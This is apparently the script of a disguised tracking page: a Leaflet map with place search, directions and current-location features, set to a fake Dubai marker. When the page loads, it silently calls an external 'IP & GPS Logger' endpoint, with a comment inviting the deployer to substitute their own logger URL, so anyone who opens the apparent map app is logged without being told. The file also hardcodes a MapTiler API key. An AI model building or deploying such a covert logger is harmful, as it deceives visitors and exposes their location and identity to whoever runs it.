let map = L.map('map').setView([25.276987, 55.296249], 13); // Fake Location: Dubai
let fakeMarker = L.marker([25.276987, 55.296249]).addTo(map);

L.tileLayer(`https://api.maptiler.com/maps/streets/256/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO`, {
  attribution: '© MapTiler © OpenStreetMap',
}).addTo(map);

// IP & GPS Logger
fetch("https://fake-logger.onrender.com/logger.php"); // Change to your logger.php URL

// Show Panels
document.getElementById('search-toggle').onclick = () => togglePanel('search-panel');
document.getElementById('direction-toggle').onclick = () => togglePanel('direction-panel');
document.getElementById('location-toggle').onclick = showCurrentLocation;

function togglePanel(id) {
  document.getElementById(id).style.display = 'flex';
}
function hidePanel(id) {
  document.getElementById(id).style.display = 'none';
}

function searchPlace() {
  const query = document.getElementById("searchBox").value;
  if (!query) return;

  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}&accept-language=en`)
    .then(res => res.json())
    .then(data => {
      if (data.length > 0) {
        const place = data[0];
        map.setView([place.lat, place.lon], 15);
        if (fakeMarker) map.removeLayer(fakeMarker);
        fakeMarker = L.marker([place.lat, place.lon]).addTo(map);
      }
    });
}

function getDirections() {
  const start = document.getElementById("start").value;
  const end = document.getElementById("end").value;

  function resolvePlace(query) {
    return fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}&accept-language=en`)
      .then(res => res.json())
      .then(data => data[0] ? [parseFloat(data[0].lat), parseFloat(data[0].lon)] : null);
  }

  Promise.all([
    start.toLowerCase() === "my location" ? getLiveCoords() : resolvePlace(start),
    resolvePlace(end)
  ]).then(([startCoords, endCoords]) => {
    if (!startCoords || !endCoords) return alert("Invalid location.");
    if (window.routeControl) map.removeControl(window.routeControl);
    window.routeControl = L.Routing.control({
      waypoints: [L.latLng(...startCoords), L.latLng(...endCoords)],
      routeWhileDragging: false,
      showAlternatives: false,
      addWaypoints: false
    }).addTo(map);
  });
}

function getLiveCoords() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve([pos.coords.latitude, pos.coords.longitude]),
      err => reject()
    );
  });
}

function showCurrentLocation() {
  getLiveCoords().then(coords => {
    const [lat, lon] = coords;
    L.marker([lat, lon], { title: "You" }).addTo(map);
    map.setView([lat, lon], 15);
  });
}
